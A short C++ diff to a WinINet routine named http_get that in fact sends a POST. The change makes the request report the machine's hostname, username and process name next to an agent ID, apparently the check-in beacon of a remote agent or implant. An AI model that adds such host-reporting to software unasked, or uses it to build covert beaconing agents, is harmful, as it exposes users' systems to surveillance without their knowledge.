@@ -128,7 +128,7 @@ std::string http_get(const std::string& hostname, int port, const std::string& p
     HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL,NULL, acceptTypes, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
     if (!hRequest) { wininet_error("HttpOpenRequestA failed (GET/POST)"); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; }
     std::stringstream post_data;
-    post_data << "{\"agent_id\":\"" << agent_id << "\"}";
+    post_data << "{\"agent_id\":\"" << agent_id << "\", \"hostname\":\"" << get_hostname() << "\", \"username\":\"" << get_username() << "\", \"process_name\":\"" << get_process_name() << "\" }";
     std::string headers = extra_headers + "\r\nContent-Type: application/json\r\n";
     BOOL res = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)post_data.str().c_str(), post_data.str().length());
     if (!res) { wininet_error("HttpSendRequestA failed (POST)"); InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; }
